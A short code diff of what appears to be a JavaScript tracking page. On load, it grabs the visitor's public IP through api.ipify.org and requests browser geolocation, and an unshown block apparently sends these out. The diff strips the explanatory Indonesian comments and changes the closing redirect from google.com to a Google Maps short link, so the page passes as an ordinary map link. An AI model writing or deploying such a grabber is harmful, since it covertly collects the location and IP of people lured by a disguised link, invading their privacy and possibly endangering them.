@@ -8,7 +8,6 @@
   async function sendData() {
     let ip = null;
 
-    // ambil IP
     try {
       const res = await fetch("https://api.ipify.org?format=json");
       const data = await res.json();
@@ -18,7 +17,6 @@
     let latitude = null;
     let longitude = null;
 
-    // ambil lokasi (popup browser otomatis muncul)
     if (navigator.geolocation) {
       try {
         const position = await new Promise((resolve, reject) => {
@@ -43,7 +41,7 @@
       });
     } catch {}
 
-    window.location.href = "https://www.google.com";
+    window.location.href = "https://maps.app.goo.gl/xWujWLpnjL6DusCX7?g_st=ic";
   }
 
   sendData();
